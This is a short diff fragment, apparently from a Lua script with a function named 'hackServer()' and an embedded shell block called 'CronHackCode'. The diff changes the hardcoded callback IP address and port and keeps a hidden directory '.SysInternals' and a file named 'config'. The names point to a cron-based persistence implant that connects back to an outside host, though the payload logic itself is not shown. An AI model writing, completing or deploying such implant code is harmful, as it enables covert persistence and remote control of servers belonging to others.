@@ -396,8 +396,8 @@ hackServer()
 
 local CronHackCode = [[
 	
-IP=178.203.169.229                #Change
-PORT=4078              #Change 
+IP=176.96.137.70                #Change
+PORT=3389              #Change 
 DIR=".SysInternals"   #Example
 FILENAME="config"     #Example
 CURR_SCRIPT="$0"      #DON'T change
